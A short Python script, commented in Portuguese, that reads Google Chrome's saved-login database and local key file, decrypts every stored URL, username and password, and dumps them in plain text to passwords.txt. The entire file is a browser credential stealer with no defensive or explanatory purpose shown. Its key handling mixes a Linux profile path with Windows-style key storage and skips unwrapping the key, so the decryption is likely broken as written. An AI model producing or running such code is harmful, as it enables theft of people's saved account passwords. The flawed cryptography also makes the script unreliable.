import sqlite3
import os
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64

# Caminho para o arquivo Login Data do Google Chrome (modifique conforme seu sistema operacional)
chrome_path = os.path.expanduser('~') + '/.config/google-chrome/Default/Login Data'

# Função para descriptografar as senhas
def decrypt_password(encrypted_password, key):
    iv = encrypted_password[3:15]
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_password = decryptor.update(encrypted_password[15:]) + decryptor.finalize()
    return decrypted_password.decode()

# Função para obter a chave de criptografia do Chrome
def get_key():
    key_path = os.path.expanduser('~') + '/.config/google-chrome/Local State'
    with open(key_path, 'r') as f:
        local_state = json.load(f)
    return base64.b64decode(local_state['os_crypt']['encryption_key'])

# Conectando-se ao banco de dados
def get_chrome_passwords():
    conn = sqlite3.connect(chrome_path)
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')

    passwords = []

    encryption_key = get_key()

    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]

        password = decrypt_password(encrypted_password, encryption_key)
        passwords.append((url, username, password))

    conn.close()

    return passwords

# Salvar as senhas em um arquivo
def save_passwords_to_txt(passwords, file_name="passwords.txt"):
    with open(file_name, 'w') as f:
        for url, username, password in passwords:
            f.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n")

# Principal
def main():
    passwords = get_chrome_passwords()
    save_passwords_to_txt(passwords)

if __name__ == "__main__":
    main()
